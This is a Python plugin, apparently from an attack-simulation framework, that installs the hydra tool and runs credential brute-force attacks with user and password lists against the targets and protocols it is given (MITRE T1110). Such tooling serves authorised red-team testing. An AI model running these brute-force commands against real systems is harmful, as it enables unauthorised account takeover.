#!/usr/bin/env python3

# A plugin for hydra bruteforce attacks

from plugins.base.kali import KaliPlugin


class HydraPlugin(KaliPlugin):

    # Boilerplate
    name = "hydra"
    description = "A plugin controlling the hydra brute forcing tool"
    ttp = "T1110"
    references = ["https://attack.mitre.org/techniques/T1110/"]

    required_files = ["passwords.txt", "users.txt"]    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

        # print("Init hydra")

    def command(self, targets, config):
        """ Generate the command (having a separate step assists on debugging)

        @param targets: A list of targets, ip addresses will do
        @param config:  dict with command specific configuration
        """

        # Set defaults if not present in config
        self.process_config(config)
        playground = self.machine_plugin.get_playground()

        # Generate command
        cmd = f"cd {playground};"
        cmd += "sudo apt -y install hydra;"
        for t in targets:
            for p in self.conf['protocols']:
                cmd += f"hydra -L {self.conf['userfile']}  -P {self.conf['pwdfile']} {p}://{t};"

        return cmd

    def run(self, targets, config):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        @param config:  dict with command specific configuration
        """

        # print("running hydra as plugin")
        cmd = self.command(targets, config)
        # res += str(self.run_cmd(cmd).stdout.strip())
        res = self.run_cmd(cmd) or ""

        # print("hydra done")

        return res
